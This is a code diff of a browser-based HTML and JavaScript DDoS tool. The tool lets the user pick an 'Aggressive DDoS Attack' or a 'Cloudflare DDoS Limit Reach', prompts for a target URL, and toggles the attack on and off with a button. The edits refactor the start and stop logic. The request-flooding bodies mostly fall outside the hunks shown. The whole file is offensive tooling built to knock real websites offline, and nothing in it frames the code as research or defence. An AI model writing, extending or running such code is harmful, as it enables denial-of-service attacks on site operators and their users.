@@ -67,54 +67,34 @@
     <div id="console"></div>
 
     <script>
+        let isAttacking = false;
+        let attackInterval;
+
         function startSelectedAttack() {
             const selectedTool = document.querySelector('input[name="ddosTool"]:checked').value;
             const statusDiv = document.getElementById('status');
             const consoleDiv = document.getElementById('console');
 
+            // Clear previous outputs
+            statusDiv.innerText = '';
+            consoleDiv.innerHTML = '';
+
             if (selectedTool === 'aggressive') {
-                // Clear previous outputs
-                statusDiv.innerText = '';
-                consoleDiv.innerHTML = '<script>let now = new Date().toLocaleString();</script>';
-                consoleOutput(`Starting Aggressive DDoS Attack at ${now}`);
-
                 // Initialize and start the aggressive DDoS attack
-                startAggressiveAttack();
+                const targetURL = prompt("Enter the target URL for the Aggressive DDoS Attack:");
+                if (targetURL) {
+                    document.getElementById('status').innerText = 'Attack in progress...';
+                    startAttackAggressive(targetURL);
+                }
             } else if (selectedTool === 'cloudflare') {
-                // Clear previous outputs
-                statusDiv.innerText = '';
-                consoleDiv.innerHTML = '<script>let now = new Date().toLocaleString();</script>';
-                consoleOutput(`Starting Cloudflare DDoS Limit Reach at ${now}`);
-
                 // Initialize and start the Cloudflare DDoS attack
-                startCloudflareAttack();
+                const targetURL = prompt("Enter the target URL for the Cloudflare DDoS Limit Reach:");
+                if (targetURL) {
+                    document.getElementById('status').innerText = 'Attack in progress...';
+                    startAttackCloudflare(targetURL);
+                }
             }
         }
-
-        function startAggressiveAttack() {
-            const targetURL = prompt("Enter the target URL for the Aggressive DDoS Attack:");
-            if (targetURL) {
-                const attackButton = document.getElementById('startButton');
-                attackButton.innerText = 'Stop Attack';
-                isAttacking = true;
-                document.getElementById('status').innerText = 'Attack in progress...';
-                startAttackAggressive(targetURL);
-            }
-        }
-
-        function startCloudflareAttack() {
-            const targetURL = prompt("Enter the target URL for the Cloudflare DDoS Limit Reach:");
-            if (targetURL) {
-                const attackButton = document.getElementById('startButton');
-                attackButton.innerText = 'Stop Attack';
-                isAttacking = true;
-                document.getElementById('status').innerText = 'Attack in progress...';
-                startAttackCloudflare(targetURL);
-            }
-        }
-
-        let isAttacking = false;
-        let attackInterval;
 
         function startAttackAggressive(targetURL) {
             function sendRequest(method, path) {
@@ -171,8 +151,7 @@
                 clearInterval(attackInterval);
             }
             isAttacking = false;
-            const attackButton = document.getElementById('startButton');
-            attackButton.innerText = 'Start Attack';
+            document.getElementById('startButton').innerText = 'Start Attack';
             document.getElementById('status').innerText = 'Attack stopped.';
         }
 
@@ -183,6 +162,14 @@
             consoleDiv.appendChild(newMessage);
             consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
         }
+
+        document.getElementById('startButton').addEventListener('click', function() {
+            if (isAttacking) {
+                stopAttack();
+            } else {
+                startSelectedAttack();
+            }
+        });
     </script>
 </body>
 </html>
